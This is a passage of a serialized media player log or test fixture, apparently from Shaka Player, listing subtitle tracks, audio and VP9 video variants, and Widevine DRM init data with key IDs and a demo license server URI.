,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nonChooseStreams_{\"startTime\":0,\"textStreams\":[{\"id\":1,\"originalId\":\"0\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"nl\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":2,\"originalId\":\"1\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"en\",\"label\":null,\"type\":\"text\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":3,\"originalId\":\"2\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"fr\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":4,\"originalId\":\"3\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"de\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":5,\"originalId\":\"4\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"it\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":6,\"originalId\":\"5\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"pl\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":7,\"originalId\":\"6\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"pt\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":8,\"originalId\":\"7\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"ru\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":9,\"originalId\":\"8\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"es\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}},{\"id\":10,\"originalId\":\"9\",\"initSegmentReference\":null,\"presentationTimeOffset\":0,\"mimeType\":\"text/vtt\",\"codecs\":\"\",\"bandwidth\":256,\"kind\":\"subtitle\",\"encrypted\":false,\"keyId\":null,\"language\":\"vi\",\"label\":null,\"type\":\"text\",\"primary\":false,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[],\"channelsCount\":null,\"closedCaptions\":{}}],\"variants\":[{\"id\":35,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":17,\"originalId\":\"14\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":346},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":84834,\"width\":256,\"height\":110,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":220346,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":36,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":18,\"originalId\":\"15\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":346},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":206965,\"width\":426,\"height\":182,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":342477,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":37,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":19,\"originalId\":\"16\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":376328,\"width\":640,\"height\":272,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":511840,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":38,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":20,\"originalId\":\"17\",\"initSegmentReference\":{\"startByte